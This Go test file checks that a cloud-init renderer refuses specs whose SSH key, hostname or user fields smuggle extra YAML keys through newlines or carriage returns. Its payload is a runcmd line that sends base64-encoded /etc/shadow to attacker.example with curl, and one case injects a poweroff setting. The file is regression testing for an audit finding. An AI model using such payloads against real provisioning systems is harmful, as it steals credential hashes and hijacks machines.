package cloudinit

import (
	"strings"
	"testing"
)

// The property: no value a client controls can open a key of its own in the
// rendered cloud-config.
//
// Written the way the audit attacked. The payload it used was a multi-line SSH
// public key, which reached the store because the pack's shape check split on
// strings.Fields, and Fields splits on newlines exactly as it does on spaces. The
// rendered document then carried runcmd at the top level.
func TestRenderRefusesAValueThatWouldOpenItsOwnKey(t *testing.T) {
	payload := "runcmd:\n  - [sh, -c, \"curl http://attacker.example/$(cat /etc/shadow | base64 -w0)\"]"

	cases := []struct {
		name string
		spec Spec
	}{
		{
			name: "through an authorized key",
			spec: Spec{
				Distribution:   "ubuntu:24.04",
				AuthorizedKeys: []string{"ssh-ed25519 AAAA\n" + payload},
			},
		},
		{
			name: "through the hostname",
			spec: Spec{
				Distribution:   "ubuntu:24.04",
				Hostname:       "victim\n" + payload,
				AuthorizedKeys: []string{"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5"},
			},
		},
		{
			name: "through the user",
			spec: Spec{
				Distribution:   "ubuntu:24.04",
				User:           "root\n" + payload,
				AuthorizedKeys: []string{"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5"},
			},
		},
		{
			name: "through a carriage return alone",
			spec: Spec{
				Distribution:   "ubuntu:24.04",
				Hostname:       "victim\rpower_state: {mode: poweroff}",
				AuthorizedKeys: []string{"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5"},
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			out, err := Render(tc.spec)
			if err == nil {
				t.Fatalf("expected a refusal, got a document:\n%s", out)
			}
			if out != "" {
				t.Fatalf("a refused render must produce nothing, got:\n%s", out)
			}
		})
	}
}

// The other half: the guard must not refuse what a real client sends. A check
// that rejected everything would pass the cases above and break every boot.
func TestRenderStillAcceptsAnOrdinarySpec(t *testing.T) {
	for _, distribution := range []string{"ubuntu:24.04", "debian:12", "almalinux:9"} {
		out, err := Render(Spec{
			Distribution:   distribution,
			Hostname:       "web-01",
			User:           "root",
			AuthorizedKeys: []string{"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample user@host"},
			InstallSSHD:    true,
		})
		if err != nil {
			t.Fatalf("%s: %v", distribution, err)
		}
		if !strings.Contains(out, "web-01") {
			t.Fatalf("%s: the hostname did not reach the document:\n%s", distribution, out)
		}
		if !strings.Contains(out, "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExample user@host") {
			t.Fatalf("%s: the key did not reach the document:\n%s", distribution, out)
		}
	}
}
